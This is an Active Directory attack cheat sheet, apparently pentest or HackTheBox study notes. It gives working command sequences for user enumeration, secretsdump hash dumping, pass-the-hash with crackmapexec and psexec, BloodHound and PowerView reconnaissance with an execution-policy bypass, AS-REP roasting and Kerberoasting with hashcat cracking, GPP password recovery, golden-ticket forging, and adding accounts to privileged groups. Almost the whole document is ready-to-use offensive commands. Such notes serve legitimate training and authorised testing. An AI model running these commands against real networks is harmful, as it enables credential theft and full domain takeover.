# Cheat Sheet

## Initial Attack Vectors

### User Enumeration

### Brute Force

#### kerbrute

```bash
kerbrute userenum --dc <IP> -d <domain.local> users.txt
# Can verify working by placing known users in user.txt i.e. administrator, guest,
```

## Post-Compromise Enumeration

#### GetADUsers

Queries target domain for users data

```bash
GetADUsers.py -all -dc-ip <IP> active.htb/svc_tgs   # Will need account creds
```

#### secretsdump

Performs various techniques to dump secrets from the remote machine without executing any agent there.

```
secretsdump.py htb.local/<username>@<IP>
secretsdump.py htb.local/<username>:<password>@<IP>
# Grab the hashes then attempt to crack or pass the hash
# Pass the hash
crackmapexec smb <IP> -u administrator -H <hash>
# If Pwn3d!...
psexec.py -hashes <hash> administrator@<IP>
```

### Bloodhound

#### Configuration

Run Bloodhound (and neo4j) then import zip file created by Sharphound

```bash
# Run neo4j first
sudo neo4j console/start
# Run Bloodhound
bloodhound --no-sandbox
```

#### neo4j

```bash
# neo4j new password/forgot password
locate no4j | grep auth
rm /usr/share/neo4j/data/dbms/auth
neo4j console
# Reset password
```

### Collection

#### SharpHound

```bash
/usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
/usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
```

```bash
.\SharpHound.exe -c all
# Will output a zip file to copy back to Kali

# Running remotely in PowerShell
.\SharphHound.exe -c all -d active.htb --domaincontroller <IP>
```

#### BloodHound.py

```bash
# Installation
pip3 install bloodhound
# Binary
bloodhound-python
# Command
bloodhound-python -u <username> -p <password> -ns <IP> -d <domain.local> -c All
# Copy json output file into Bloodhound
python3.8 bloodhound.py -ns <IP> -d intelligence.htb -dc dc.intelligence.htb -u <username> -p <password> -c All
# Start neo4j and upload the output to Bloodhound
```

### Enumeration

```bash
# After importing, search on what you have owned
# Ex: search on username, right click and mark as owned
# Then navigate to Queries and look at Shortest Paths
# Look at Service accounts/Account Operators which have special permissions create accounts and put htem in different groups
# Ex: Create new user and add them to a group that has higher permissions; can't be Administrator gourp
net user <username> <password> /add/ domain
net group "Exchange Windows Permissions"  # Check for group members
net group "Exchange Windows Permissions" /add <username>  # Add user to group in quotes
# Then back in Bloodhound, right click group added (graph line) and look at Abuse Info.
# Will most likely use PowerView for the Abuse
```

#### Node Info

* Can search and select a specific user, machine, etc. where you can get details of it.
* Can right click on user in graph and mark as owned.
* Can right click on permission and click on Help.

#### Queries

* Find AS-REP Roastable Users (DontReqPreAuth)&#x20;
* Find Shortest Paths to Domain Admin
* Shortest Paths to Domain Admins from Owned Principals

## PowerView

Cheat Sheet - [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Setup

```powershell
# Navigate to the directory PowerView is in
powershell -ep bypass  # load a powershell shell with execution policy bypassed
. .\PowerView.ps1  # import the PowerView module
```

### Example

```powershell
Get-NetComputer -fulldata | select operatingsystem  # gets a list of all operating systems on the domain
Get-NetUser | select cn  # gets a list of all users on the domain
Get-NetGroup  # Get groups
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}  # Get Kerberoastable user from a specified group
```

## AS-REP Roasting

> Must have a username or list of usernames to perform

### GetNPUsers

Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

```bash
# From Kali
GetNPUsers.py -dc-ip <IP> -request 'htb.local/'
# Look for user/hash output
GetNPUsers.py -dc-ip <IP> -request 'htb.local/' -format hashcat  # Put it in hashcat format in prep to crack
# Hashcat Crack
hashcat -m 18200 hash.txt rockyou.txt -r rules/InsidePro-PasswordsPro.rule

GetNPUsers.py <domain.local>/<username> -dc-ip=<IP>
# Look "getting its TGT"
$krb5asrep$23$<username>@<domain.local>:12345...
# Then can attempt to brute force offline with John/Hashcat or Pass the Hash
# If cracked...
crackmapexec smb <IP> -u <user> -p <password>  # Look for Pwn3d!
crackmapexec smb <IP> -u <user> -p <password> --shares  # Check for SMB shares to access
```

## Kerberoasting

> Must have an already compromised account to authenticate with

### GetUserSPNs

```bash
# From Kali
GetUserSPNs.py -dc-ip <IP> <domain.local>/<compromised username>
# A list of accounts with SPNs should show along with the account name, etc.
GetUserSPNs.py -dc-ip <IP> <domain.local>/<compromised username> -request
GetUserSPNs.py -dc-ip <IP> active.htb/svc_tgs -request 
# Look for the hash in the output
$krb5tgs$23$*<Username>$<domain.local$<domain.local>/<username*>$12345...
# Then can attempt to brute force offline with John/Hashcat or Pass the Hash
# Finally attempt to login with psexec, evil-winrm, etc.
```

## GPP Credentials

> Must have an already compromised account to authenticate with

### Get-GPPPassword.ps1

```bash
# From Windows Target
findstr /S /I cpassword \\<domain.local>\sysvol\<domain.local>\policies\*.xml
# Look for the cpassword= value
cpassword="<value>"
# Then can attempt to decrypt them offline using PowerSploit's Get-GPPPassword.ps1
Get-GPPPassword
# Look for Password value output
```

## Silver Ticket

## Golden Ticket

### From Linux

#### Impacket

After dumping the hashes, we will use the `krbtgt` user and hash that was found.

```bash
# From Target: Get Domain SID via PowerShell cmdlet
Get-ADDomain htb.local  # Look for DomainSID
# From Kali
python ticket.py <nt-hash> -domain-sid <DomainSID> -domain htb.local <fake-username>
export KRB5CCNAME=<fake-username>.cache
# Then use psexec
psexec.py htb.local/<fake-username>@<IP> -k -no-pass  # Using IP
psexec.py htb.local/<fake-username>@<DOMAIN> -k -no-pass  # May need to user domain
# DEBUG
## Redo steps replaceing <fake-username> with administrator
# Can also try wmiexec, smbexec
```

#### Mimikatz

## Resources

#### Mind Maps

AD - [https://www.xmind.net/m/5dypm8/](https://www.xmind.net/m/5dypm8/)

General Enumeration - [https://www.xmind.net/m/QsNUEz/](https://www.xmind.net/m/QsNUEz/)

#### WADComs

[https://wadcoms.github.io/](https://wadcoms.github.io/)

#### Methodology

[https://book.hacktricks.xyz/windows/active-directory-methodology](https://book.hacktricks.xyz/windows/active-directory-methodology)

[https://www.thehacker.recipes/](https://www.thehacker.recipes/)

[https://www.ired.team/](https://www.ired.team/)

#### Resources

[https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

[https://zer1t0.gitlab.io/posts/attacking\_ad/](https://zer1t0.gitlab.io/posts/attacking\_ad/)

[https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

[https://github.com/61106960/adPEAS](https://github.com/61106960/adPEAS)

#### Writeups

[https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff](https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff)

[https://n0h4ts.medium.com/passing-the-new-oscp-b9fcd434ade7](https://n0h4ts.medium.com/passing-the-new-oscp-b9fcd434ade7)
